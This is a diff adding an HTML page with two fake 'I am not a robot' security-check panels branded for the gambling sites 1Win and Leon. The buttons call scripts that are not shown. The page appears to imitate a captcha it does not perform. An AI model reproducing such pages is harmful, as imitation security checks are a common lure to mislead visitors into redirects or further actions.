@@ -1,0 +1,66 @@
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Megapari </title>
+    <link rel="stylesheet" href="styles.css">
+    <link href="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css" rel="stylesheet">
+    
+</head>
+<body>
+    
+     
+    
+    <div class="container">
+        
+        <div class="row">
+            
+            <div class="col-lg-6 col-md-12">
+                <div class="content">
+                    <img src="img/smtps.png" alt="Aviator Logo" class="logo">
+                    <h1>1Win</h1>
+                    <p>One More Step...</p>
+                    <p>Please Complete the Security Check!</p>
+                    <div class="captcha-container">
+                        <button class="cta-button" onclick="startCaptcha()">I am not a robot</button>
+                        <div class="captcha-verification">
+                            <div class="loading-spinner" id="loading-spinner"></div>
+                            <div class="checkmark" id="checkmark">
+                                <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 52 52">
+                                    <path class="checkmark__check" fill="none" d="M14 27l8 8 16-16"/>
+                                </svg>
+                            </div>
+                        </div>
+                        <p id="success-message" class="success-message"></p>
+                    </div>
+                </div>
+            </div>
+
+            <div class="col-lg-6 col-md-12">
+                <div class="content">
+                    <img src="img/images (2).png" alt="Aviator Logo" class="logo">
+                    <h1>Leon</h1>
+                    <p>One More Step...</p>
+                    <p>Please Complete the Security Check!</p>
+                    <div class="captcha-containertwo"">
+                        <button class="cta-button-two" onclick="twocapther()">I am not a robot</button>
+                        <div class="captcha-verificationtwo">
+                            <div class="loading-spinner-two" id="loading-spinner-two"></div>
+                            <div class="checkmarktwo" id="checkmarktwo">
+                                <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 52 52">
+                                    <path class="checkmark__check" fill="none" d="M14 27l8 8 16-16"/>
+                                </svg>
+                            </div>
+                        </div>
+                        <p id="success-message-two" class="success-message-two"></p>
+                    </div>
+                </div>
+            </div>
+        </div>
+      
+    </div>
+    <script src="script.js"></script>
+</body>
+</html>
